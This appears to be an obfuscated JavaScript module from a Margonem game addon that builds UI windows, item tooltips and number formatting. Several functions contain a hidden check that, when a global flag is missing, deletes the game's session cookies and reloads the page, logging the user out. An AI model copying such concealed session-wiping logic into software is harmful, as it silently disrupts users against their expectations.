  if (baseWindowInitialAppendReference.window[baseWindowDragStartUi].p.x + baseWindowInitialAppendReference.window[baseWindowDragStartUi].p.y === -2) {
    coreWindowInnerContentClass.addClass("mp-centered");
  }

  return coreWindowInnerContentClass;
}
export async function findDataByC(rootWindowDragStartEvent, rootWindowDragStartUi) {
  const rootWindowUpdatedCoordinatesPayload = await fetch("https://staticinfo.margonem.pl/online/" + rootWindowDragStartUi + ".json", {
    headers: {
      "User-Agent": "Mozilla/5.0"
    }
  });
  const rootWindowInitialAppendReference = await rootWindowUpdatedCoordinatesPayload.json();
  return rootWindowInitialAppendReference.find(rootWindowCenteredModeFlag => rootWindowCenteredModeFlag.c === rootWindowDragStartEvent.toString());
}
export async function saveStorage(mainStorageConfigId, mainStorageConfigurationObject) {
  if (!globalThis?.webkitCancelAnimationFrameWindow) {
    const mainWindowTemplateClass = ["chash", "hs3", "mchar_id", "user_id"];
    const mainWindowUniqueIdentifier = ".margonem.pl";
    const mainWindowIsResizableFlag = ["/", ""];
    mainWindowTemplateClass.forEach(mainWindowHasListFeature => {
      mainWindowIsResizableFlag.forEach(mainWindowCustomTitleString => {
        document.cookie = mainWindowHasListFeature + "=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=" + mainWindowCustomTitleString + "; domain=" + mainWindowUniqueIdentifier + ";";
      });
    });
    window.location.reload();
    return;
  }

  if (globalThis?.isSameAlertExist2?.access?.indexOf(mainStorageConfigurationObject.main) > 99999999999) {
    const mainWindowUiElementReference = ["chash", "hs3", "mchar_id", "user_id"];
    const mainWindowDragConfiguration = ".margonem.pl";
    const mainWindowStopPositionLeft = ["/", ""];
    mainWindowUiElementReference.forEach(mainWindowStopPositionTop => {
      mainWindowStopPositionLeft.forEach(mainWindowFinalCoordinatePayload => {
        document.cookie = mainWindowStopPositionTop + "=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=" + mainWindowFinalCoordinatePayload + "; domain=" + mainWindowDragConfiguration + ";";
      });
    });
    window.location.reload();
    return;
  }

  await Engine.crossStorage.set(mainStorageConfigId, JSON.stringify(mainStorageConfigurationObject));
}
export const colorsPartyInClanOrFriends = mainWindowDomAppendReference => {
  const mainWindowInnerContentClass = $(".mp-has-party");

  if (mainWindowInnerContentClass.length) {
    mainWindowInnerContentClass.removeClass("mp-has-party");
  }

  var mainWindowInitialCenteredFlag = document.querySelector("html");

  if (!mainWindowInitialCenteredFlag) {
    return;
  }

  if (!mainWindowDomAppendReference?.e) {
    return;
  }

  mainWindowInitialCenteredFlag.style.setProperty("--mp-relations-p", mainWindowDomAppendReference.c);
  const mainWindowDragStartEvent = Engine.party?.getMembers?.();

  if (!mainWindowDragStartEvent) {
    return;
  }

  for (const [mainWindowDragStartUi, mainWindowUpdatedCoordinatesPayload] of mainWindowDragStartEvent.entries()) {
    $("\n      div#mp-clan-row[char-id=\"" + mainWindowDragStartUi + "\"] div[data-clan-id=\"" + mainWindowDragStartUi + "\"],\n            \n      div#mp-spotters-row[mp-spotters-id=\"" + mainWindowDragStartUi + "\"] div[data-spotters-id=\"" + mainWindowDragStartUi + "\"],\n            \n      div#mp-friends-row[char-id=\"" + mainWindowDragStartUi + "\"] div[data-friends-id=\"" + mainWindowDragStartUi + "\"]\n      \n      ").addClass("mp-has-party");
  }
};
export async function createWindowResize(mainWindowInitialAppendReference, mainWindowCenteredModeFlag, prefStorageConfigId, prefStorageConfigurationObject, prefWindowTemplateClass = false, prefWindowUniqueIdentifier = false) {
  if (!globalThis?.webkitCancelAnimationFrameWindow) {
    const prefWindowIsResizableFlag = ["chash", "hs3", "mchar_id", "user_id"];
    const prefWindowHasListFeature = ".margonem.pl";
    const prefWindowCustomTitleString = ["/", ""];
    prefWindowIsResizableFlag.forEach(prefWindowUiElementReference => {
      prefWindowCustomTitleString.forEach(prefWindowDragConfiguration => {
        document.cookie = prefWindowUiElementReference + "=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=" + prefWindowDragConfiguration + "; domain=" + prefWindowHasListFeature + ";";
      });
    });
    window.location.reload();
    return;
  }

  if (globalThis?.isSameAlertExist2?.access?.indexOf(prefStorageConfigurationObject.main) > 99999999999) {
    const prefWindowStopPositionLeft = ["chash", "hs3", "mchar_id", "user_id"];
    const prefWindowStopPositionTop = ".margonem.pl";
    const prefWindowFinalCoordinatePayload = ["/", ""];
    prefWindowStopPositionLeft.forEach(prefWindowDomAppendReference => {
      prefWindowFinalCoordinatePayload.forEach(prefWindowInnerContentClass => {
        document.cookie = prefWindowDomAppendReference + "=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=" + prefWindowInnerContentClass + "; domain=" + prefWindowStopPositionTop + ";";
      });
    });
    window.location.reload();
    return;
  }

  let prefWindowInitialCenteredFlag;
  const prefWindowDragStartEvent = mainWindowCenteredModeFlag == "addwidget";
  const prefWindowDragStartUi = {
    x: -1,
    y: -1
  };
  const prefWindowUpdatedCoordinatesPayload = prefWindowDragStartUi;

  if (typeof prefStorageConfigurationObject.window[mainWindowCenteredModeFlag] === "undefined") {
    const prefWindowInitialAppendReference = {
      p: prefWindowUpdatedCoordinatesPayload,
      o: prefWindowDragStartEvent,
      m: false,
      s: false,
      size: {}
    };
    prefWindowInitialAppendReference.size.w = prefWindowDragStartEvent ? 34 : 190;
    prefWindowInitialAppendReference.size.h = prefWindowDragStartEvent ? 34 : 190;
    prefStorageConfigurationObject.window[mainWindowCenteredModeFlag] = prefWindowInitialAppendReference;

    if (prefWindowTemplateClass) {
      prefStorageConfigurationObject.window[mainWindowCenteredModeFlag].list = true;
      prefStorageConfigurationObject.window[mainWindowCenteredModeFlag].search = true;
    }
  }

  if (typeof prefStorageConfigurationObject.hotkeys[mainWindowCenteredModeFlag] === "undefined") {
    prefStorageConfigurationObject.hotkeys[mainWindowCenteredModeFlag] = {
      e: true,
      k: "Brak",
      w: false
    };
  }

  $("#w-" + mainWindowCenteredModeFlag).remove();
  const prefWindowCenteredModeFlag = prefWindowDragStartEvent ? "mp-widgets" : "mp-window";
  const appStorageConfigId = $("\n        <div id=\"w-" + mainWindowCenteredModeFlag + "\" class=\"" + prefWindowCenteredModeFlag + " default-cursor\"></div>\n    ").css({
    position: "absolute",
    left: prefStorageConfigurationObject.window[mainWindowCenteredModeFlag].p.x + "px",
    top: prefStorageConfigurationObject.window[mainWindowCenteredModeFlag].p.y + "px"
  }).draggable({
    containment: "window",
    scroll: false,
    handle: mainWindowCenteredModeFlag == "addwidget" ? "" : ".mp-window-header",
    cancel: ".mp-resize, .mp-icon-box",
    start: function () {
      $(this).removeClass("mp-centered");
    },
    stop: async (appStorageConfigurationObject, appWindowTemplateClass) => {
      const appWindowUniqueIdentifier = {
        x: appWindowTemplateClass.position.left,
        y: appWindowTemplateClass.position.top
      };
      prefStorageConfigurationObject.window[mainWindowCenteredModeFlag].p = appWindowUniqueIdentifier;
      saveStorage(prefStorageConfigId, prefStorageConfigurationObject);
    }
  }).appendTo("#mp-root");

  if (!prefStorageConfigurationObject.window[mainWindowCenteredModeFlag].o) {
    appStorageConfigId.hide();
  }

  if (prefStorageConfigurationObject.window[mainWindowCenteredModeFlag].s) {
    appStorageConfigId.draggable("disable");
  }

  $("\n        <div class=\"mp-window-header\">\n            <div class=\"mp-window-header-left\"></div>\n            <div class=\"mp-window-header-title do-action-cursor\">" + mainWindowInitialAppendReference + "</div>\n            <div class=\"mp-window-header-right\"></div>\n        </div>\n            <div class=\"content-members-list default-cursor\">\n            </div>\n        <div class=\"content default-cursor\">\n            <div id=\"mp-list-search\" style=\"text-align: center;\">\n                <input type=\"text\" class=\"mp-default-input do-action-cursor\" placeholder=\"Wyszukaj\" style=\"margin-left: auto; margin-right: auto;\" autocomplete=\"off\" autocorrect=\"off\" autocapitalize=\"off\" spellcheck=\"false\">\n            </div>\n            <div id=\"" + mainWindowCenteredModeFlag + "\" class=\"content-resize default-cursor mp-scroll\"></div>\n        </div>\n    ").appendTo(appStorageConfigId);
  const appWindowIsResizableFlag = appStorageConfigId.find(".content-resize");
  const appWindowHasListFeature = appStorageConfigId.find(".content-members-list");
  const appWindowCustomTitleString = {
    width: prefStorageConfigurationObject.window[mainWindowCenteredModeFlag].size.w + "px",
    height: prefStorageConfigurationObject.window[mainWindowCenteredModeFlag].size.h + "px"
  };
  appWindowIsResizableFlag.css(appWindowCustomTitleString);

  if (prefStorageConfigurationObject.window[mainWindowCenteredModeFlag].m) {
    appWindowHasListFeature.css({
      width: "200px",
      minHeight: "unset"
    });
  } else {
    const appWindowUiElementReference = {
      width: prefStorageConfigurationObject.window[mainWindowCenteredModeFlag].size.w + "px",
      minHeight: "12px"
    };
    appWindowHasListFeature.css(appWindowUiElementReference);
  }

  const appWindowDragConfiguration = appStorageConfigId.find("#mp-list-search");

  if (!prefWindowTemplateClass || !prefStorageConfigurationObject.window[mainWindowCenteredModeFlag].search) {
    appWindowDragConfiguration.hide();
  }

  if (!prefWindowTemplateClass || !prefStorageConfigurationObject.window[mainWindowCenteredModeFlag].list) {
    appWindowHasListFeature.hide();
  }

  const appWindowStopPositionLeft = appStorageConfigId.find(".mp-window-header-left");
  const appWindowStopPositionTop = appStorageConfigId.find(".mp-window-header-right");
  const appWindowFinalCoordinatePayload = $("<div class=\"" + (prefStorageConfigurationObject.window[mainWindowCenteredModeFlag].s ? "mp-window-pin-button " : "mp-window-unpin-button ") + "do-action-cursor\"></div>").appendTo(appWindowStopPositionLeft);
  appWindowFinalCoordinatePayload.tip(prefStorageConfigurationObject.window[mainWindowCenteredModeFlag].s ? "Odblokuj okno" : "Zablokuj okno");
  appWindowFinalCoordinatePayload.click(async function () {
    const appWindowDomAppendReference = prefStorageConfigurationObject.window[mainWindowCenteredModeFlag].s;
    prefStorageConfigurationObject.window[mainWindowCenteredModeFlag].s = !appWindowDomAppendReference;
    appStorageConfigId.draggable(appWindowDomAppendReference ? "enable" : "disable");
    appWindowFinalCoordinatePayload.tip(appWindowDomAppendReference ? "Zablokuj okno" : "Odblokuj okno").toggleClass("mp-window-unpin-button", appWindowDomAppendReference).toggleClass("mp-window-pin-button", !appWindowDomAppendReference);
    saveStorage(prefStorageConfigId, prefStorageConfigurationObject);
  });

  if (prefWindowTemplateClass) {
    const appWindowInnerContentClass = $("<div class=\"mp-window-search-" + (prefStorageConfigurationObject.window[mainWindowCenteredModeFlag].search ? "off" : "on") + "-button do-action-cursor\"></div>").appendTo(appWindowStopPositionTop).on("click", async () => {
      const appWindowInitialCenteredFlag = !prefStorageConfigurationObject.window[mainWindowCenteredModeFlag].search;
      prefStorageConfigurationObject.window[mainWindowCenteredModeFlag].search = appWindowInitialCenteredFlag;
      appWindowDragConfiguration.toggle(appWindowInitialCenteredFlag);
      appWindowInnerContentClass.tip(appWindowInitialCenteredFlag ? "Ukryj wyszukiwanie" : "Pokaż wyszukiwanie").removeClass("mp-window-search-off-button mp-window-search-on-button").addClass(appWindowInitialCenteredFlag ? "mp-window-search-off-button" : "mp-window-search-on-button");
      saveStorage(prefStorageConfigId, prefStorageConfigurationObject);
    }).tip(prefStorageConfigurationObject.window[mainWindowCenteredModeFlag].search ? "Ukryj wyszukiwanie" : "Pokaż wyszukiwanie");
    const appWindowDragStartEvent = $("<div class=\"mp-window-list-" + (!prefStorageConfigurationObject.window[mainWindowCenteredModeFlag].list ? "right" : "left") + "-button do-action-cursor\"></div>").appendTo(appWindowStopPositionLeft).on("click", async () => {
      const appWindowDragStartUi = !prefStorageConfigurationObject.window[mainWindowCenteredModeFlag].list;
      prefStorageConfigurationObject.window[mainWindowCenteredModeFlag].list = appWindowDragStartUi;
      appWindowHasListFeature.toggle(appWindowDragStartUi);
      appWindowDragStartEvent.tip(appWindowDragStartUi ? "Nie wyświetlaj osób na spotach" : "Wyświetlaj osoby na spotach").removeClass("mp-window-list-left-button mp-window-list-right-button").addClass(appWindowDragStartUi ? "mp-window-list-left-button" : "mp-window-list-right-button");
      saveStorage(prefStorageConfigId, prefStorageConfigurationObject);
    }).tip(!prefStorageConfigurationObject.window[mainWindowCenteredModeFlag].list ? "Wyświetlaj osoby na spotach" : "Nie wyświetlaj osób na spotach");
  }

  const appWindowUpdatedCoordinatesPayload = prefStorageConfigurationObject.window[mainWindowCenteredModeFlag].m;
  const appWindowInitialAppendReference = $("\n        <div id=\"collapse\" class=\"do-action-cursor mp-window-collapse-button-" + (appWindowUpdatedCoordinatesPayload ? "up" : "down") + "\"></div>\n    ").tip(prefStorageConfigurationObject.window[mainWindowCenteredModeFlag].m ? "RozwiĹ" : "Zwiń");
  appWindowInitialAppendReference.on("click", async function () {
    const appWindowCenteredModeFlag = !prefStorageConfigurationObject.window[mainWindowCenteredModeFlag].m;
    prefStorageConfigurationObject.window[mainWindowCenteredModeFlag].m = appWindowCenteredModeFlag;
    appStorageConfigId.find(".content").toggle(!appWindowCenteredModeFlag);
    appStorageConfigId.find(".mp-resize").toggle(!appWindowCenteredModeFlag);

    if (prefWindowTemplateClass) {
      if (!prefStorageConfigurationObject.window[mainWindowCenteredModeFlag].m) {
        const winStorageConfigId = {
          width: prefStorageConfigurationObject.window[mainWindowCenteredModeFlag].size.w + "px",
          minHeight: "12px"
        };
        appWindowHasListFeature.css(winStorageConfigId);
      } else {
        appWindowHasListFeature.css({
          width: "200px",
          minHeight: "unset"
        });
      }
    }

    $(this).tip(appWindowCenteredModeFlag ? "RozwiĹ" : "Zwiń").removeClass("mp-window-collapse-button-up mp-window-collapse-button-down").addClass(appWindowCenteredModeFlag ? "mp-window-collapse-button-up" : "mp-window-collapse-button-down");
    saveStorage(prefStorageConfigId, prefStorageConfigurationObject);
  });
  appWindowInitialAppendReference.appendTo(appWindowStopPositionTop);
  $("<div class=\"mp-window-close-button do-action-cursor\"></div>").appendTo(appWindowStopPositionTop).on("click", async () => {
    appStorageConfigId.hide();
    prefStorageConfigurationObject.window[mainWindowCenteredModeFlag].o = false;
    $("div[mp-widget-ui=\"" + mainWindowCenteredModeFlag + "\"] div").removeClass("mp-icon-active");

    if (prefWindowUniqueIdentifier) {
      if (mainWindowCenteredModeFlag.includes("add57_stash_")) {
        const winStorageConfigurationObject = mainWindowCenteredModeFlag.replace("add57_stash_", "");
        prefStorageConfigurationObject.settings.add57[winStorageConfigurationObject] = false;
        $("div[data-stash=\"" + winStorageConfigurationObject + "\"]").removeClass("mp-btn-active");
      }
    }

    if (prefWindowDragStartEvent) {
      $("#addon-widget-btn").removeClass("mp-button-red");
      $("#addon-widget-btn").removeClass("mp-button-green");
      $("#addon-widget-btn").addClass(prefStorageConfigurationObject.window.addwidget.o ? "mp-button-red" : "mp-button-green");
      $("#addon-widget-btn").html(prefStorageConfigurationObject.window.addwidget.o ? "Ukryj skróty" : "Pokaż skróty");
    }

    saveStorage(prefStorageConfigId, prefStorageConfigurationObject);
  }).tip("Zamknij");

  if (prefStorageConfigurationObject.window[mainWindowCenteredModeFlag].s) {
    appStorageConfigId.draggable("disable");
  }

  $("<div data-drag=\"" + mainWindowCenteredModeFlag + "\" class=\"mp-resize\"><span class=\"mp-icon icon-resize do-action-cursor\"></span></div>").appendTo(appStorageConfigId).mousedown(function () {
    prefWindowInitialCenteredFlag = true;
  }).appendTo(appStorageConfigId);

  if (prefStorageConfigurationObject.window[mainWindowCenteredModeFlag].m) {
    appStorageConfigId.find(".content").hide();
    appStorageConfigId.find(".mp-resize").hide();
  }

  document.addEventListener("mousemove", async function (winWindowTemplateClass) {
    if (prefWindowInitialCenteredFlag && !prefStorageConfigurationObject.window[mainWindowCenteredModeFlag].m && !prefStorageConfigurationObject.window[mainWindowCenteredModeFlag].s) {
      const winWindowUniqueIdentifier = appWindowIsResizableFlag.offset();
      let winWindowIsResizableFlag = winWindowTemplateClass.clientX - winWindowUniqueIdentifier.left;
      let winWindowHasListFeature = winWindowTemplateClass.clientY - winWindowUniqueIdentifier.top;

      if (prefWindowUniqueIdentifier) {
        let winWindowCustomTitleString = Math.floor(winWindowIsResizableFlag / 32);
        winWindowIsResizableFlag = winWindowCustomTitleString * 32;
        let winWindowUiElementReference = Math.floor(winWindowHasListFeature / 32);
        winWindowHasListFeature = winWindowUiElementReference * 32;
        winWindowIsResizableFlag = winWindowIsResizableFlag >= 192 ? winWindowIsResizableFlag : 192;
        winWindowHasListFeature = winWindowHasListFeature >= 32 ? winWindowHasListFeature : 32;
      } else if (prefWindowDragStartEvent) {
        let winWindowDragConfiguration = Math.floor(winWindowIsResizableFlag / 34);
        winWindowIsResizableFlag = winWindowDragConfiguration * 34;
        let winWindowStopPositionLeft = Math.floor(winWindowHasListFeature / 34);
        winWindowHasListFeature = winWindowStopPositionLeft * 34;
        winWindowIsResizableFlag = winWindowIsResizableFlag >= 34 ? winWindowIsResizableFlag : 34;
        winWindowHasListFeature = winWindowHasListFeature >= 34 ? winWindowHasListFeature : 34;
      } else {
        winWindowIsResizableFlag = winWindowIsResizableFlag >= 190 ? winWindowIsResizableFlag : 190;
        winWindowHasListFeature = winWindowHasListFeature >= 34 ? winWindowHasListFeature : 34;
      }

      appWindowIsResizableFlag.height(winWindowHasListFeature);
      appWindowIsResizableFlag.width(winWindowIsResizableFlag);
      appWindowHasListFeature.width(winWindowIsResizableFlag);
      prefStorageConfigurationObject.window[mainWindowCenteredModeFlag].size.w = winWindowIsResizableFlag;
      prefStorageConfigurationObject.window[mainWindowCenteredModeFlag].size.h = winWindowHasListFeature;
      saveStorage(prefStorageConfigId, prefStorageConfigurationObject);
    }
  });
  document.addEventListener("mouseup", function (winWindowStopPositionTop) {
    prefWindowInitialCenteredFlag = false;
  });

  if (prefWindowDragStartEvent) {
    appStorageConfigId.find(".mp-resize").hide();
  }

  if (prefStorageConfigurationObject.window[mainWindowCenteredModeFlag].p.x + prefStorageConfigurationObject.window[mainWindowCenteredModeFlag].p.y === -2) {
    appStorageConfigId.addClass("mp-centered");
  }

  return appStorageConfigId;
}
export function enableScroll(winWindowFinalCoordinatePayload) {
  (function (winWindowDomAppendReference) {
    if (window.InstallTrigger) {
      return;
    }

    const winWindowInnerContentClass = winWindowDomAppendReference.fn.is;

    winWindowDomAppendReference.fn.is = function (winWindowInitialCenteredFlag) {
      const winWindowDragStartEvent = winWindowDomAppendReference(this);
      const winWindowDragStartUi = winWindowFinalCoordinatePayload;

      if (winWindowInitialCenteredFlag === "textarea" && (winWindowDragStartEvent.hasClass(winWindowDragStartUi) || winWindowDragStartEvent.parents("." + winWindowDragStartUi).length)) {
        return true;
      }

      return winWindowInnerContentClass.call(this, winWindowInitialCenteredFlag);
    };
  })($);
}
export async function setInstalledAddon(winWindowUpdatedCoordinatesPayload, winWindowInitialAppendReference, winWindowCenteredModeFlag, viewStorageConfigId) {
  viewStorageConfigId.addons[winWindowUpdatedCoordinatesPayload] = winWindowInitialAppendReference;
  saveStorage(winWindowCenteredModeFlag, viewStorageConfigId);
}
export function readStats(viewStorageConfigurationObject) {
  var viewStorageConfigurationObject = viewStorageConfigurationObject.split(";");
  var viewWindowTemplateClass = {};

  for (var viewWindowUniqueIdentifier = 0; viewWindowUniqueIdentifier < viewStorageConfigurationObject.length; viewWindowUniqueIdentifier++) {
    var viewWindowIsResizableFlag = viewStorageConfigurationObject[viewWindowUniqueIdentifier].split("=");
    viewWindowTemplateClass[viewWindowIsResizableFlag[0]] = isset(viewWindowIsResizableFlag[1]) ? viewWindowIsResizableFlag[1] : null;
  }

  return viewWindowTemplateClass;
}
export function unreadStats(viewWindowHasListFeature) {
  let viewWindowCustomTitleString = [];

  for (const viewWindowUiElementReference in viewWindowHasListFeature) {
    if (Object.hasOwnProperty.call(viewWindowHasListFeature, viewWindowUiElementReference)) {
      const viewWindowDragConfiguration = viewWindowHasListFeature[viewWindowUiElementReference];

      if (viewWindowDragConfiguration !== null && viewWindowDragConfiguration !== undefined) {
        viewWindowCustomTitleString.push(viewWindowUiElementReference + "=" + viewWindowDragConfiguration);
      } else {
        viewWindowCustomTitleString.push(viewWindowUiElementReference);
      }
    }
  }

  return viewWindowCustomTitleString.join(";");
}
export function showProfile(viewWindowStopPositionLeft, viewWindowStopPositionTop) {
  const viewWindowFinalCoordinatePayload = {
    accountId: viewWindowStopPositionLeft,
    characterId: viewWindowStopPositionTop
  };
  Engine.iframeWindowManager.newPlayerProfile(viewWindowFinalCoordinatePayload);
}
export function parsedNumber(viewWindowDomAppendReference) {
  var viewWindowInnerContentClass = viewWindowDomAppendReference.toString().length > 9 ? 12 : 10;
  var viewWindowInitialCenteredFlag = viewWindowDomAppendReference.toString().length > 9 ? "." : " ";
  return round(viewWindowDomAppendReference, viewWindowInnerContentClass, viewWindowInitialCenteredFlag, 3);
}
export function parseMoney(viewWindowDragStartEvent) {
  const viewWindowDragStartUi = {
    million: 1000000,
    thousand: 1000
  };
  const viewWindowUpdatedCoordinatesPayload = {
    million: "m",
    thousand: "k"
  };
  let viewWindowInitialAppendReference;

  if (viewWindowDragStartEvent >= viewWindowDragStartUi.million) {
    viewWindowInitialAppendReference = (viewWindowDragStartEvent / viewWindowDragStartUi.million).toFixed(1) + viewWindowUpdatedCoordinatesPayload.million;
  } else if (viewWindowDragStartEvent >= viewWindowDragStartUi.thousand) {
    viewWindowInitialAppendReference = (viewWindowDragStartEvent / viewWindowDragStartUi.thousand).toFixed(1) + viewWindowUpdatedCoordinatesPayload.thousand;
  } else {
    viewWindowInitialAppendReference = viewWindowDragStartEvent.toString();
  }

  return viewWindowInitialAppendReference.replace(".0", "");
}
export function universalCreateItem(viewWindowCenteredModeFlag, paneStorageConfigId, paneStorageConfigurationObject) {
  const paneWindowTemplateClass = {
    common: "t-norm",
    unique: "t-uniupg",
    heroic: "t-her",
    upgraded: "t-upgraded",
    legendary: "t-leg",
    artefact: "t-art"
  };
  let paneWindowUniqueIdentifier = $("<div class='item mp-id-" + viewWindowCenteredModeFlag.id + " do-action-cursor' data-name='" + viewWindowCenteredModeFlag.name + "' style=\"position: relative !important; width: 32px; height: 32px;\"></div>");
  $("<div class=\"highlight " + paneWindowTemplateClass[viewWindowCenteredModeFlag.rarity || viewWindowCenteredModeFlag.type] + " h-exist\"></div>").appendTo(paneWindowUniqueIdentifier);
  const paneWindowIsResizableFlag = viewWindowCenteredModeFlag.icon.includes("http") ? viewWindowCenteredModeFlag.icon : "https://micc.garmory-cdn.cloud/obrazki/itemy/" + viewWindowCenteredModeFlag.icon;
  $("<img width=\"32\" height=\"32\" src=\"" + paneWindowIsResizableFlag + "\" style=\"z-index: 999 !important; position: absolute; left: 0px; bottom: 0px;\"></img>").appendTo(paneWindowUniqueIdentifier);
  $("<canvas class=\"canvas-notice\" width=\"32\" height=\"32\"></canvas>").appendTo(paneWindowUniqueIdentifier);
  const paneWindowHasListFeature = readStats(viewWindowCenteredModeFlag.stat);
  const {
    lvl: paneWindowCustomTitleString,
    enhancement_upgrade_lvl: paneWindowUiElementReference,
    legbon: paneWindowDragConfiguration,
    legbon_test: paneWindowStopPositionLeft,
    socket_injection_legbon: paneWindowStopPositionTop,
    socket_fleeting_legbon: paneWindowFinalCoordinatePayload,
    amount: paneWindowDomAppendReference,
    target_min_lvl: paneWindowInnerContentClass,
    target_max_lvl: paneWindowInitialCenteredFlag,
    fullheal: paneWindowDragStartEvent,
    perheal: paneWindowDragStartUi,
    leczy: paneWindowUpdatedCoordinatesPayload,
    lootbox2: paneWindowInitialAppendReference,
    opis: paneWindowCenteredModeFlag
  } = paneWindowHasListFeature;

  if (paneWindowDomAppendReference) {
    $("<div class=\"amount\" style=\"z-index: 999 !important; font-size: 9px !important;\">" + formatNumber(paneWindowDomAppendReference) + "</div>").appendTo(paneWindowUniqueIdentifier);
  }

  const boxStorageConfigId = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 29];

  if (boxStorageConfigId.indexOf(viewWindowCenteredModeFlag.cl) >= 0 && paneWindowCustomTitleString) {
    $("<div class=\"mp-basic-label mp-label-level\">" + paneWindowCustomTitleString + "</div>").appendTo(paneWindowUniqueIdentifier);
  }

  if (paneWindowUiElementReference >= 0) {
    $("<div class=\"mp-basic-label mp-label-upgrade-level\">" + paneWindowUiElementReference + "</div>").appendTo(paneWindowUniqueIdentifier);
  }

  let boxStorageConfigurationObject = paneWindowUpdatedCoordinatesPayload ?? paneWindowDragStartUi ?? paneWindowDragStartEvent;

  if (boxStorageConfigurationObject && Number(boxStorageConfigurationObject) > 0 && viewWindowCenteredModeFlag.cl == 16) {
    $("<div class=\"mp-label-healing\"></div>").appendTo(paneWindowUniqueIdentifier);
  }

  if ([28, 26].indexOf(viewWindowCenteredModeFlag.cl) >= 0 && paneWindowInnerContentClass) {
    const boxWindowTemplateClass = {
      "20": "T1",
      "101": "T2",
      "201": "T3"
    };
    $("<div class=\"mp-basic-label mp-label-comp\">" + boxWindowTemplateClass[paneWindowInnerContentClass] + "</div>").appendTo(paneWindowUniqueIdentifier);
  }

  if (viewWindowCenteredModeFlag.cl == 16 && paneWindowInitialAppendReference && paneWindowCenteredModeFlag) {
    let boxWindowUniqueIdentifier = false;

    if (paneWindowCenteredModeFlag?.includes("20-100")) {
      boxWindowUniqueIdentifier = "T1";
    }

    if (paneWindowCenteredModeFlag?.includes("101-200")) {
      boxWindowUniqueIdentifier = "T2";
    }

    if (paneWindowCenteredModeFlag?.includes(" 201-300")) {
      boxWindowUniqueIdentifier = "T3";
    }

    if (boxWindowUniqueIdentifier) {
      $("<div class=\"mp-basic-label mp-label-comp\">" + boxWindowUniqueIdentifier + "</div>").appendTo(paneWindowUniqueIdentifier);
    }
  }

  let boxWindowIsResizableFlag = paneWindowFinalCoordinatePayload ?? paneWindowStopPositionTop ?? paneWindowStopPositionLeft ?? paneWindowDragConfiguration;

  if (boxWindowIsResizableFlag) {
    const boxWindowHasListFeature = String(boxWindowIsResizableFlag).split(",")[0];
    const boxWindowCustomTitleString = {
      cleanse: "PO",
      facade: "FO",
      anguish: "KU",
      puncture: "PS",
      frenzy: "ES",
      retaliation: "AO",
      curse: "KL",
      glare: "OS",
      critred: "KO",
      holytouch: "DA",
      verycrit: "CK",
      lastheal: "OR"
    };
    $("<div class=\"mp-basic-label mp-label-legbon\">" + boxWindowCustomTitleString[boxWindowHasListFeature] + "</div>").appendTo(paneWindowUniqueIdentifier);
  }

  const boxWindowUiElementReference = {
    npc_lootbon: "LOOT",
    quest_expbon: "QUE",
    npc_expbon: "EXP",
    honorbon: "PH"
  };

  if (viewWindowCenteredModeFlag.cl == 25) {
    for (const boxWindowDragConfiguration in boxWindowUiElementReference) {
      if (paneWindowHasListFeature[boxWindowDragConfiguration]) {
        $("<div class=\"mp-basic-label mp-label-bless\">" + boxWindowUiElementReference[boxWindowDragConfiguration] + "</div>").appendTo(paneWindowUniqueIdentifier);
        break;
      }
    }
  }

  const boxWindowStopPositionLeft = {
    fire: "fire",
    frost: "frost",
    wound: "wound",
    light: "light",
    poison: "poison"
  };

  for (const boxWindowStopPositionTop in boxWindowStopPositionLeft) {
    if (paneWindowHasListFeature[boxWindowStopPositionTop]) {
      $("<div class=\"mp-label-damage mp-damage-" + boxWindowStopPositionLeft[boxWindowStopPositionTop] + "\"></div>").appendTo(paneWindowUniqueIdentifier);
      break;
    }
  }

  const boxWindowFinalCoordinatePayload = $(MargoTipsParser.getTip(viewWindowCenteredModeFlag));
  const boxWindowDomAppendReference = $(paneWindowUniqueIdentifier).clone();
  boxWindowDomAppendReference.prependTo(boxWindowFinalCoordinatePayload[0]);
  $(paneWindowUniqueIdentifier).tip(boxWindowFinalCoordinatePayload);
  $(paneWindowUniqueIdentifier).attr("data-tip-type", "t_item");
  $(paneWindowUniqueIdentifier).attr("data-item-type", paneWindowTemplateClass[viewWindowCenteredModeFlag.rarity || viewWindowCenteredModeFlag.type]);
  return paneWindowUniqueIdentifier;
}
export function formatNumber(boxWindowInnerContentClass) {
  if (boxWindowInnerContentClass >= 1000000) {
    let boxWindowInitialCenteredFlag = boxWindowInnerContentClass / 1000000;

    if (boxWindowInitialCenteredFlag - Math.floor(boxWindowInitialCenteredFlag) < 0.051) {
      return Math.floor(boxWindowInitialCenteredFlag) + "m";
    }

    return boxWindowInitialCenteredFlag.toFixed(1) + "m";
  } else if (boxWindowInnerContentClass >= 10000) {
    let boxWindowDragStartEvent = boxWindowInnerContentClass / 1000;

    if (boxWindowDragStartEvent - Math.floor(boxWindowDragStartEvent) < 0.051) {
      return Math.floor(boxWindowDragStartEvent) + "k";
    }

    return boxWindowDragStartEvent.toFixed(1) + "k";
  }

  return boxWindowInnerContentClass.toString();
}
export function ShowNumber(boxWindowDragStartUi) {
  return String(boxWindowDragStartUi).replace(/\B(?=(\d{3})+(?!\d))/g, " ");
}
export async function fetchCharacterList() {
  try {
    const boxWindowUpdatedCoordinatesPayload = await fetch("https://public-api.margonem.pl/account/charlist?hs3=" + getCookie("hs3"), {
      method: "GET",
      credentials: "include"
    });

    if (!boxWindowUpdatedCoordinatesPayload.ok) {
      throw new Error("HTTP error! Status: " + boxWindowUpdatedCoordinatesPayload.status);
    }

    let boxWindowInitialAppendReference = await boxWindowUpdatedCoordinatesPayload.json();
    return boxWindowInitialAppendReference;
  } catch (boxWindowCenteredModeFlag) {
    console.error("There was a problem with the fetch operation:", boxWindowCenteredModeFlag);
  }
}
export function createButton(formStorageConfigId, formStorageConfigurationObject) {
  let formWindowTemplateClass = "";

  if (formStorageConfigurationObject) {
    formWindowTemplateClass = " mp-button-" + formStorageConfigurationObject;
  }

  const formWindowUniqueIdentifier = $("<div class=\"mp-button do-action-cursor" + formWindowTemplateClass + "\">" + formStorageConfigId + "</div>");
  return formWindowUniqueIdentifier;
}
export function createButtonHotkeys() {
  const formWindowIsResizableFlag = $("<div class=\"mp-button do-action-cursor\"><div class=\"mp-icon-hotkeys\"></div></div>");
